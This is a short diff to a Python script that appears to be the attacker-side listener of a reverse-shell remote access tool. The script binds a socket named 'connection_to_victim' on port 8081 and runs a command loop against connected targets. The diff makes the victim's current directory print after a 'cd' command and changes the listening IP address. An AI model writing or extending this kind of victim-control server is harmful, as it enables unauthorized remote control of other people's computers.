@@ -125,6 +125,8 @@ def shell(target, ip):
             os.system('clear')
         
         elif command[:3] == 'cd ':
+            files = reliable_recv()
+            print("Current Directory: ",files)
             pass
     
         elif command[:3] == 'pwd':
@@ -227,7 +229,7 @@ ips = []
 targets = []
 stop_threads = False
 connection_to_victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection_to_victim.bind(("192.168.246.129", 8081))
+connection_to_victim.bind(("192.168.0.105", 8081))
 connection_to_victim.listen(10)
 t1 = threading.Thread(target=server)
 t1.start()
